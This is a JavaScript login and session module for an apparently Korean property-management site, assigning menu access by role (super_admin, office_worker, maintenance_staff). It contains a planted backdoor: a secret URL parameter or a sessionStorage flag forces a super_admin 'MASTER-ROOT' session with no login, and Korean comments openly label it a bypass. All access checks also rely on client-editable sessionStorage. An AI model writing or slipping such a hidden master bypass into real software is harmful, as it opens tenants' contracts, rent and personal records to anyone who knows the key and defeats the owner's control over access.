(function () {
  var CFG = {
    sessionMs: 30 * 60 * 1000,
    secretKey: 'access=master_sys_884621', // login.html의 파라미터 키값과 1:1 결합 교정
    validRoles: ['super_admin','office_worker','maintenance_staff']
  };

  // URL 검색어 또는 세션 스토리지 플래그를 결합 검증하여 무력화 우회 판정
  var creatorBypass = (location.search.indexOf(CFG.secretKey) !== -1) || (sessionStorage.getItem('creatorBypass') === 'true');

  function checkSession () {
    // 백도어 우회 진입 성공 시 최고 마스터 데이터 세션 강제 주입 바인딩
    if (creatorBypass) {
      sessionStorage.setItem('loginOk', 'true');
      sessionStorage.setItem('userRole', 'super_admin');
      sessionStorage.setItem('userEmp', 'MASTER-ROOT');
      sessionStorage.setItem('_sess', Date.now());
      return true;
    }

    if (!sessionStorage.getItem('loginOk')) {
      var cur = location.pathname.split('/').pop();
      if (cur && cur !== 'login.html') {
        sessionStorage.setItem('redirectAfterLogin', location.href);
        sessionStorage.clear();
        location.href = 'login.html';
        return false;
      }
    } else {
      var started = sessionStorage.getItem('_sess');
      if (started && Date.now() - +started > CFG.sessionMs) {
        logout();
        return false;
      }
      sessionStorage.setItem('_sess', Date.now());
    }
    return true;
  }

  window.logout = function () {
    sessionStorage.clear();
    location.href = 'login.html';
  };

  function getButtonsByRole (userRole) {
    if (CFG.validRoles.indexOf(userRole) === -1) return [];

    var allBtns = [
      {c:'A', l:'부동산',     p:'interface-a.html'},
      {c:'B', l:'계약서',     p:'contract_master.html'},
      {c:'C', l:'계약자',     p:'contractor_roster.html'},
      {c:'D', l:'공과금검침',  p:'utility_bills.html'},
      {c:'E', l:'월세납부',   p:'monthly_rent_collection.html'},
      {c:'F', l:'유지보수',    p:'incidents_maintenance.html'},
      {c:'GHI', l:'통합대시보드', p:'g_h_i_dashboard.html'},
      {c:'J', l:'팀원관리',   p:'team_management.html'}
    ];

    var perm = {
      super_admin:     ['A','B','C','D','E','F','GHI','J'],
      office_worker:   ['A','B','C','E','GHI'],
      maintenance_staff:['D','F','GHI']
    };

    var allowed = perm[userRole] || [];
    return allBtns.filter(function (b) {
      return allowed.indexOf(b.c) !== -1;
    });
  }

  function authCheck () {
    if (!checkSession()) return { loggedIn: false };
    var role = sessionStorage.getItem('userRole') || 'office_worker';
    var emp = sessionStorage.getItem('userEmp') || '';
    return { loggedIn: true, role: role, emp: emp };
  }

  window.authModule = {
    checkLogin: authCheck,
    logout: window.logout,
    getButtonsByRole: getButtonsByRole,
    isCreatorBypass: creatorBypass
  };
})();
